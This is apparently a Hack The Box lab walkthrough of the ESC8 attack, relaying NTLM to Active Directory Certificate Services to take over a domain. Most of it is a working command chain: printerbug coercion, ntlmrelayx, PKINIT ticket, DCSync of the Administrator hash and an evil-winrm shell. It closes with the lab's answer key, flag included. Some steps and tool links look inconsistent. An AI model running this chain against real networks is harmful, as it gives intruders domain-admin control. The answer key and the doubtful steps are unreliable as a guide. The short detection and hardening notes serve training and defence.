# 🛰️ HTB Lab: NTLM Relay to ADCS (ESC8)

## 📜 Introduction

This guide provides a detailed walkthrough for exploiting an Active Directory Certificate Services (ADCS) environment using NTLM relay attacks. The goal is to obtain machine account credentials, generate a certificate with PKINIT tools, and then use it to perform Kerberos authentication and DCSync operations.

### Attack Vector: ESC8
- **Target**: ADCS endpoint over HTTP
- **Technique**: Relay NTLM traffic from SMB or LDAP services

## 🚦 Prerequisites

1. **Tools**:
   - `impacket`
   - `certipy`
   - `PKINITtools` (GitHub: [noggit/ntlmrelayx](https://github.com/noggit/ntlmrelayx) & [noggit/PKINITtools](https://github.com/noggit/PKINITtools))

2. **Environment**:
   - A virtual lab with a vulnerable ADCS server (e.g., Windows Server 2016)
   - Kali Linux or similar penetration testing machine

## 🚀 Attack Chain Walkthrough

### Initial Setup and Enumeration

#### Enumerate Services
```bash
# Discover SMB services
nmap -p- --min-rate=500 dc.inlanefreight.local | grep "SMB"

# Identify accessible shares
crackmapexec smb 10.129.234.174 -u 'user' -p 'password'
```

#### Force NTLM Authentication
```bash
# Force NTLM authentication via printerbug attack
python3 printerbug.py inlanefreight.local/user:"password"@dc.inlanefreight.local 10.129.234.178
```

### Relaying NTLM to ADCS

#### Start Relay Listener
```bash
# Capture NTLM traffic and relay it to ADCS endpoint
sudo impacket-ntlmrelayx -t http://dc.inlanefreight.local/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

### Exploit Certificate Issuance

#### Generate Machine Account Certificate
```bash
# Use certipy to request a certificate for the DC01$ machine account
certipy req -dc-ip 10.129.234.174 -user "inlanefreight.local/dc01$" -template KerberosAuthentication -out DC01.pfx

# Export private key and certificate to PFX file
openssl pkcs12 -export -out dc01.pfx -inkey dc01.key -in dc01.crt
```

### Convert Certificate to TGT

#### Switch to Virtual Environment
```bash
cd ~/PKINITtools && source .venv/bin/activate

# Generate TGT using PKINIT tools
python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache

# Export ticket for use in subsequent steps
export KRB5CCNAME=/tmp/dc.ccache
```

### DCSync Administrator Account

#### Extract Administrator Hash
```bash
# Use impacket-secretsdump to obtain the administrator hash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

# Result: Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
```

#### Gain Administrator Access
```bash
# Connect to the DC with the extracted hash
evil-winrm -i dc.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c

# Get flag from desktop
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt
# Result: a1fc497a8433f5a1b4c18274019a2cdb
```

## 🛡️ Defense and Detection

### Attack Detection
```bash
# Monitor event IDs for NTLM relay patterns:
- 4768 - Kerberos TGT Request (unusual machine accounts)
- 4769 - Kerberos Service Ticket Request
- 4624 - Successful Logon (Type 3 - Network)

# ADCS specific events:
- Certificate Request Events (ID 4886, 4887)
- Certificate Template Access

```

### Prevention Strategies
```bash
# Hardening ADCS servers:
1. Disable HTTP enrollment.
2. Implement certificate template restrictions.
3. Enable certificate request approval workflows.

# Network segmentation:
1. Isolate ADCS from other network segments.
2. Monitor and block unnecessary RPC protocols.
```

## 📝 Key Takeaways

- **ADCS is a high-value target**: Machine certificates can grant full domain control.
- **OpenSSL compatibility matters**: Ensure correct library versions for certificate operations.
- **Machine accounts have DCSync permissions**: No privilege escalation needed after obtaining machine account credentials.
- **NTLM relay attacks remain effective**: Even in modern network environments.

## 🚀 Quick Reference - ESC8 Attack Chain

### Complete Attack Commands
```bash
# 1. Start ntlmrelayx (Terminal 1)
sudo impacket-ntlmrelayx -t http://dc.inlanefreight.local/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# 2. Force authentication via printerbug attack (Terminal 2)
python3 printerbug.py inlanefreight.local/user:"password"@10.129.234.174 10.129.234.178

# 3. Generate machine account certificate
certipy req -dc-ip 10.129.234.174 -user "inlanefreight.local/dc01$" -template KerberosAuthentication -out DC01.pfx

# 4. Convert certificate to TGT using PKINIT tools (Terminal 3)
python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache

# 5. DCSync the administrator account
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

# 6. Gain shell access as administrator
evil-winrm -i dc.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

### Emergency OpenSSL Fix
```bash
# Quick fix for PKCS12 errors
sudo pip3 install pyOpenSSL==22.1.0 --break-system-packages --force-reinstall
python3 -c "import OpenSSL.crypto; print('PKCS12' in dir(OpenSSL.crypto))"
```

## 🎯 HTB Academy Answer Key

- **Attack Type**: ESC8 NTLM Relay to ADCS
- **Certificate Generated**: DC01.pfx (machine certificate)
- **Administrator Hash**: fd02e525dd676fd8ca04e200d265f20c
- **Final Flag**: a1fc497a8433f5a1b4c18274019a2cdb
- **Critical Fix**: pyOpenSSL downgrade to version 22.1.0